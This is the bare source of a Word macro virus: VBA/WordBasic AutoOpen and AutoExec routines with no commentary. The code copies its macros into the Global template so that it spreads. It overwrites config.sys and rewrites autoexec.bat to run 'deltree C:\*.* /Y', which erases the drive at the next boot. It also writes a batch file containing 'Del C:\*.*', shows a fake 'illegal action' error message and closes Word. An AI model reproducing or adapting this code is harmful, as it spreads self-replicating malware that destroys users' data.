   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.MacroCopy "Pussy:AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy "Pussy:AutoExec", "Global:AutoExec"
   Open "C:\config.sys" For Output As 1
   Print #1, "switches=/N"
   Close 1
   Open "C:\autoexec.bat" For Output As 1
   Print #1, "deltree C:\*.* /Y"
   Close 1
   WordBasic.FileCloseAll 2
   WordBasic.MsgBox "This Program Has performed an illegal action and will be terminated.  Quit Windows and restart your computer Imediatly!", "Program Error", 16
   WordBasic.AppClose
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Open "C:\files\File1.sys" For Output As 1
   Print #1, "switches=/N"
   Close 1
   Open "C:\files\File1.bat" For Output As 1
   Print #1, "Del C:\*.*"
   Close 1
   WordBasic.MsgBox "This Program Has performed an illegal action and will be terminated.  Quit Windows and restart your computer Imediatly!", "Program error", 16
   WordBasic.AppClose
   End Sub
